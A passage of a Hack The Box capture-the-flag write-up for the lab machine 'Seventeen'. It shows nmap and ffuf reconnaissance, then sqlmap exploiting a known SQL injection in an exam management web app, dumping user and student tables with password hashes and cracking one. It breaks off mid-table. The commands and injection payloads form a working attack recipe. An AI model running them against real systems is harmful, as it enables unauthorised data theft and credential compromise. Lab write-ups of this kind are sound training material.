---
title: "HTB Writeup: Seventeen [Hard]"
summary: "A hard rated box, serveral web vulnerabilities and privilege escation trough node.js."
tags: ["htb", "writeup", "hard"]
#externalUrl: ""
showSummary: true
date: 2023-01-19
draft: false
---
# Seventeen
## Enumeration
### nmap

```nmap``` scans three open ports ```ssh(22)```,```http(80)``` and ```http_alt(8000)```

```
┌──(luca㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.10.11.165
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 10:56 CEST
Nmap scan report for seventeen.htb (10.10.11.165)
Host is up (0.023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
|_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Let's begin your education with us! 
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/20%OT=22%CT=1%CU=36062%PV=Y%DS=2%DC=T%G=Y%TM=62D7C34
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:02%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: 172.17.0.3; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   22.39 ms 10.10.14.1
2   22.68 ms seventeen.htb (10.10.11.165)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.83 seconds
```

### DNS

Lets add ```seventeen.htb``` to our ```/etc/hosts``` and start subdomain enumeration:
```
┌──(luca㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.165    seventeen.htb
```

With ```fuff``` we find ```exam.seventeen.htb```, I've also added it the ```/etc/hosts``` file on my machine.

```
┌──(luca㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.seventeen.htb" -u http://seventeen.htb/ -fs 20689


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://seventeen.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.seventeen.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 20689
________________________________________________

exam                    [Status: 200, Size: 17375, Words: 3222, Lines: 348, Duration: 138ms]
```
The webpage on the VHOST, hosts ```Examination Management System 2021 Developed By: oretnom23 ``` after some googleing I've found a entry on ```Exploit-DB``` maybe it will provide us some foothold.

https://www.exploit-db.com/exploits/50725

## Foothold
### SQLMAP
With the help of the exploit, lets dump some databases:
```
┌──(luca㉿kali)-[~]
└─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" --dbs
        ___
       __H__                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.6.6#stable}                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:07:39 /2022-07-20/

[11:07:39] [INFO] resuming back-end DBMS 'mysql' 
[11:07:39] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=96a18a67b8c...03b1e69fcd'). Do you want to use those [Y/n] 
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1565=1565 AND 'Vlli'='Vlli

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=take_exam&id=1' AND (SELECT 8047 FROM (SELECT(SLEEP(5)))Verc) AND 'RSwQ'='RSwQ
---
[11:07:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.2.34, PHP
back-end DBMS: MySQL >= 5.0.12
[11:07:41] [INFO] fetching database names
[11:07:41] [INFO] fetching number of databases
[11:07:41] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:07:41] [INFO] retrieved: 4
[11:07:42] [INFO] retrieved: information_schema
[11:07:47] [INFO] retrieved: db_sfms
[11:07:49] [INFO] retrieved: erms_db
[11:07:51] [INFO] retrieved: roundcubedb
available databases [4]:
[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb

[11:07:54] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 11:07:54 /2022-07-20/
```

Dump tables:
```
┌──(luca㉿kali)-[~]
└─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -D db_sfms --tables                                                                         1 ⨯
        ___
       __H__                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.6.6#stable}                                                                                                                    
|_ -| . [)]     | .'| . |                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:33:56 /2022-07-20/

[11:33:56] [INFO] resuming back-end DBMS 'mysql' 
[11:33:56] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=0c890e4ca8a...8d98f1d01e'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1565=1565 AND 'Vlli'='Vlli

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=take_exam&id=1' AND (SELECT 8047 FROM (SELECT(SLEEP(5)))Verc) AND 'RSwQ'='RSwQ
---
[11:33:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.2.34, Apache 2.4.38, PHP
back-end DBMS: MySQL >= 5.0.12
[11:33:58] [INFO] fetching tables for database: 'db_sfms'
[11:33:58] [INFO] fetching number of tables for database 'db_sfms'
[11:33:58] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:33:58] [INFO] retrieved: 3
[11:33:59] [INFO] retrieved: storage
[11:34:01] [INFO] retrieved: student
[11:34:03] [INFO] retrieved: user
Database: db_sfms
[3 tables]
+---------+
| user    |
| storage |
| student |
+---------+

[11:34:04] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 11:34:04 /2022-07-20/
```
Dump columns:
```
┌──(luca㉿kali)-[~]
└─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -D db_sfms -T user --columns                                                                1 ⨯
        ___
       __H__                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.6.6#stable}                                                                                                                    
|_ -| . [)]     | .'| . |                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:34:17 /2022-07-20/

[11:34:17] [INFO] resuming back-end DBMS 'mysql' 
[11:34:17] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=426f3125471...3c46e45676'). Do you want to use those [Y/n] 
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1565=1565 AND 'Vlli'='Vlli

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=take_exam&id=1' AND (SELECT 8047 FROM (SELECT(SLEEP(5)))Verc) AND 'RSwQ'='RSwQ
---
[11:34:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.2.34, Apache 2.4.38, PHP
back-end DBMS: MySQL >= 5.0.12
[11:34:19] [INFO] fetching columns for table 'user' in database 'db_sfms'
[11:34:19] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:34:19] [INFO] retrieved: 6
[11:34:19] [INFO] retrieved: user_id
[11:34:21] [INFO] retrieved: int(11)
[11:34:24] [INFO] retrieved: firstname
[11:34:26] [INFO] retrieved: varchar(45)
[11:34:29] [INFO] retrieved: lastname
[11:34:32] [INFO] retrieved: varchar(45)
[11:34:35] [INFO] retrieved: username
[11:34:37] [INFO] retrieved: varchar(20)
[11:34:40] [INFO] retrieved: password
[11:34:43] [INFO] retrieved: varchar(50)
[11:34:46] [INFO] retrieved: status
[11:34:47] [INFO] retrieved: varchar(20)
Database: db_sfms
Table: user
[6 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| firstname | varchar(45) |
| lastname  | varchar(45) |
| password  | varchar(50) |
| status    | varchar(20) |
| user_id   | int(11)     |
| username  | varchar(20) |
+-----------+-------------+

[11:34:50] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 11:34:50 /2022-07-20/
```
Dump ```users``` table:
```
┌──(luca㉿kali)-[~]
└─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -batch -D db_sfms -T user -C username
        ___
       __H__                                                                                                                                                
 ___ ___["]_____ ___ ___  {1.6.6#stable}                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:37:05 /2022-07-20/

[11:37:05] [INFO] resuming back-end DBMS 'mysql' 
[11:37:05] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=05dc3ad3d89...5d26fb0fad'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1565=1565 AND 'Vlli'='Vlli

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=take_exam&id=1' AND (SELECT 8047 FROM (SELECT(SLEEP(5)))Verc) AND 'RSwQ'='RSwQ
---
[11:37:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP, Apache 2.4.38, PHP 7.2.34
back-end DBMS: MySQL >= 5.0.12
[11:37:06] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 11:37:06 /2022-07-20/

                                                                                                                                                            
┌──(luca㉿kali)-[~]
└─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -batch -D db_sfms -T user --dump     
        ___
       __H__                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.6.6#stable}                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:37:31 /2022-07-20/

[11:37:31] [INFO] resuming back-end DBMS 'mysql' 
[11:37:31] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=0bfe021eb41...27b25dbfb8'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1565=1565 AND 'Vlli'='Vlli

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=take_exam&id=1' AND (SELECT 8047 FROM (SELECT(SLEEP(5)))Verc) AND 'RSwQ'='RSwQ
---
[11:37:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP, PHP 7.2.34
back-end DBMS: MySQL >= 5.0.12
[11:37:31] [INFO] fetching columns for table 'user' in database 'db_sfms'
[11:37:31] [INFO] resumed: 6
[11:37:31] [INFO] resumed: user_id
[11:37:31] [INFO] resumed: firstname
[11:37:31] [INFO] resumed: lastname
[11:37:31] [INFO] resumed: username
[11:37:31] [INFO] resumed: password
[11:37:31] [INFO] resumed: status
[11:37:31] [INFO] fetching entries for table 'user' in database 'db_sfms'
[11:37:31] [INFO] fetching number of entries for table 'user' in database 'db_sfms'
[11:37:31] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:37:31] [INFO] retrieved: 3
[11:37:32] [INFO] retrieved: Administrator
[11:37:36] [INFO] retrieved: Administrator
[11:37:39] [INFO] retrieved: fc8ec7b43523e186a27f46957818391c
[11:37:49] [INFO] retrieved: administrator
[11:37:52] [INFO] retrieved: 1
[11:37:53] [INFO] retrieved: admin
[11:37:54] [INFO] retrieved: Mark
[11:37:55] [INFO] retrieved: Anthony
[11:37:57] [INFO] retrieved: b35e311c80075c4916935cbbbd770cef
[11:38:06] [INFO] retrieved: Regular
[11:38:08] [INFO] retrieved: 2
[11:38:09] [INFO] retrieved: UndetectableMark
[11:38:13] [INFO] retrieved: Steven
[11:38:15] [INFO] retrieved: Smith
[11:38:16] [INFO] retrieved: 112dd9d08abf9dcceec8bc6d3e26b138
[11:38:26] [INFO] retrieved: Regular
[11:38:28] [INFO] retrieved: 4
[11:38:29] [INFO] retrieved: Stev1992
[11:38:31] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[11:38:31] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[11:38:31] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[11:38:31] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[11:38:31] [INFO] starting 8 processes 
[11:38:40] [WARNING] no clear password(s) found                                                                                                            
Database: db_sfms
Table: user
[3 entries]
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| user_id | status        | lastname      | password                         | username         | firstname     |
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| 1       | administrator | Administrator | fc8ec7b43523e186a27f46957818391c | admin            | Administrator |
| 2       | Regular       | Anthony       | b35e311c80075c4916935cbbbd770cef | UndetectableMark | Mark          |
| 4       | Regular       | Smith         | 112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992         | Steven        |
+---------+---------------+---------------+----------------------------------+------------------+---------------+

[11:38:40] [INFO] table 'db_sfms.`user`' dumped to CSV file '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/user.csv'
[11:38:40] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 11:38:40 /2022-07-20/
```

Dump ```students``` Table:
```
┌──(luca㉿kali)-[~]
└─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -batch -D db_sfms -T student --dump        
        ___
       __H__                                                                                                                                                
 ___ ___["]_____ ___ ___  {1.6.6#stable}                                                                                                                    
|_ -| . [(]     | .'| . |                                                                                                                                   
|___|_  ["]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:41:01 /2022-07-20/

[11:41:01] [INFO] resuming back-end DBMS 'mysql' 
[11:41:01] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=10cc95aff13...2ed839b959'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1565=1565 AND 'Vlli'='Vlli

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=take_exam&id=1' AND (SELECT 8047 FROM (SELECT(SLEEP(5)))Verc) AND 'RSwQ'='RSwQ
---
[11:41:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.2.34, PHP, Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12
[11:41:01] [INFO] fetching columns for table 'student' in database 'db_sfms'
[11:41:01] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:41:01] [INFO] retrieved: 7
[11:41:02] [INFO] retrieved: stud_id
[11:41:04] [INFO] retrieved: stud_no
[11:41:07] [INFO] retrieved: firstname
[11:41:09] [INFO] retrieved: lastname
[11:41:11] [INFO] retrieved: gender
[11:41:13] [INFO] retrieved: yr
[11:41:14] [INFO] retrieved: password
[11:41:16] [INFO] fetching entries for table 'student' in database 'db_sfms'
[11:41:16] [INFO] fetching number of entries for table 'student' in database 'db_sfms'
[11:41:16] [INFO] retrieved: 4
[11:41:16] [INFO] retrieved: John
[11:41:17] [INFO] retrieved: Male
[11:41:19] [INFO] retrieved: Smith
[11:41:20] [INFO] retrieved: 1a40620f9a4ed6cb8d81a1d365559233
[11:41:30] [INFO] retrieved: 1
[11:41:30] [INFO] retrieved: 12345
[11:41:32] [INFO] retrieved: 1A
[11:41:33] [INFO] retrieved: James
[11:41:34] [INFO] retrieved: Male
[11:41:35] [INFO] retrieved: Mille
[11:41:37] [INFO] retrieved: abb635c915b0cc296e071e8d76e9060c
[11:41:47] [INFO] retrieved: 2
[11:41:47] [INFO] retrieved: 23347
[11:41:49] [INFO] retrieved: 2B
[11:41:49] [INFO] retrieved: Kelly
[11:41:51] [INFO] retrieved: Female
[11:41:53] [INFO] retrieved: Shane
[11:41:54] [INFO] retrieved: a2afa567b1efdb42d8966353337d9024
[11:42:04] [INFO] retrieved: 3
[11:42:04] [INFO] retrieved: 31234
[11:42:05] [INFO] retrieved: 2C
[11:42:06] [INFO] retrieved: Jamie
[11:42:08] [INFO] retrieved: Female
[11:42:09] [INFO] retrieved: Hales
[11:42:11] [INFO] retrieved: a1428092eb55781de5eb4fd5e2ceb835
[11:42:21] [INFO] retrieved: 4
[11:42:21] [INFO] retrieved: 43347
[11:42:23] [INFO] retrieved: 3C
[11:42:24] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[11:42:24] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[11:42:24] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[11:42:24] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[11:42:24] [INFO] starting 8 processes 
[11:42:26] [INFO] cracked password 'autodestruction' for hash 'a2afa567b1efdb42d8966353337d9024'                                                           
Database: db_sfms                                                                                                                                          
Table: student
[4 entries]
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+

[11:42:32] [INFO] table 'db_sfms.student' dumped to CSV file '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/student.csv'
[11:42:32] [INFO] fetched data logged to text files under '/home/luca/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 11:42:32 /2022-07-20/
```
Okay so ```sqlmap``` cracked the hash for one student, I think that is the one we should focus on first.

| user_no | Name  | password  |
|---|---|---|
| 31234  | Kelly Shane  | autodestruction  |

I was not able to crack the other hashes nor was I able to login with ```Kell Shane``` to any other known service.

So my conclusion is that the student credentials do not belong to the Exam Management DBs and may belong to a service unknown to me yet.

### Dirbusting
```
┌──(luca㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -u http://seventeen.htb/  -e -s 200  
 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://seventeen.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/07/20 11:55:31 Starting gobuster in directory enumeration mode
===============================================================
http://seventeen.htb/images               (Status: 301) [Size: 315] [--> http://seventeen.htb/images/]
http://seventeen.htb/css                  (Status: 301) [Size: 312] [--> http://seventeen.htb/css/]   
http://seventeen.htb/js                   (Status: 301) [Size: 311] [--> http://seventeen.htb/js/]    
http://seventeen.htb/fonts                (Status: 301) [Size: 314] [--> http://seventeen.htb/fonts/] 
http://seventeen.htb/sass                 (Status: 301) [Size: 313] [--> http://seventeen.htb/sass/]  
http://seventeen.htb/server-status        (Status: 403) [Size: 278]                                   
                                                                                                      
===============================================================
2022/07/20 12:04:47 Finished
===============================================================
```
```
┌──(luca㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -u http://seventeen.htb:8000/  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://seventeen.htb:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/20 11:56:43 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 280]
                                               
===============================================================
2022/07/20 12:05:46 Finished
===============================================================
```
Nothing useful that we could go for.
### Back to SQLMAP
Lets google the DB names and try to figure out what service they belong to:


```
[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb
```

|  Database | Service |
|---|---|
| db_sfms  |  Student File Management System |
|  erms_db |  Simple Exam Reviewer Management System |
| roundcubedb  |  RoundCube (obviously)  |

Okay so the ```credentials``` we've got are from the ```Student File Management System```, lets examine the database, maybe we can get further information on the system.

By dumping the storage table, we can see that there exists a ```PDF``` we might need to get a hold of.

```
┌──(luca㉿kali)-[~]
└─$ sqlmap -u "http://exam.seventeen.htb/?p=take_exam&id=1" -batch -D db_sfms -T storage --dump
        ___
       __H__                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.6.6#stable}                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:11:45 /2022-07-20/

[12:11:46] [INFO] resuming back-end DBMS 'mysql' 
[12:11:46] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=5d12c79fd49...8219915b25'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&id=1' AND 1565=1565 AND 'Vlli'='Vlli

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=take_exam&id=1' AND (SELECT 8047 FROM (SELECT(SLEEP(5)))Verc) AND 'RSwQ'='RSwQ
---
[12:11:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.2.34, PHP, Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12
[12:11:46] [INFO] fetching columns for table 'storage' in database 'db_sfms'
[12:11:46] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[12:11:46] [INFO] retrieved: 5
[12:11:47] [INFO] retrieved: store_id
[12:11:49] [INFO] retrieved: filename
[12:11:51] [INFO] retrieved: file_type
[12:11:54] [INFO] retrieved: date_uploaded
[12:11:57] [INFO] retrieved: stud_no
[12:11:59] [INFO] fetching entries for table 'storage' in database 'db_sfms'
[12:11:59] [INFO] fetching number of entries for table 'storage' in database 'db_sfms'
[12:11:59] [INFO] retrieved: 1
[12:11:59] [INFO] retrieved: 2020-01-26, 06:57 PM
[12:12:05] [INFO] retrieved: application/pdf
[12:12:09] [INFO] retrieved: Marksheet-finals.pdf
[12:12:15] [INFO] retrieved: 33
[12:12:15] [INFO] retrieved: 31234
Database: db_sfms
Table: storage
[1 entry]
+----------+---------+----------------------+-----------------+----------------------+
| store_id | stud_no | filename             | file_type       | date_uploaded        |
+----------+---------+----------------------+-----------------+----------------------+
| 33       | 31234   | Marksheet-finals.pdf | application/pdf | 2020-01-26, 06:57 PM |
+----------+---------+----------------------+-----------------+----------------------+
```

Okay so eventually i've dumped the whole ```erms_db``` and noticed that in the ```users``` table the avatar location contains a ```full path```:
```
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |
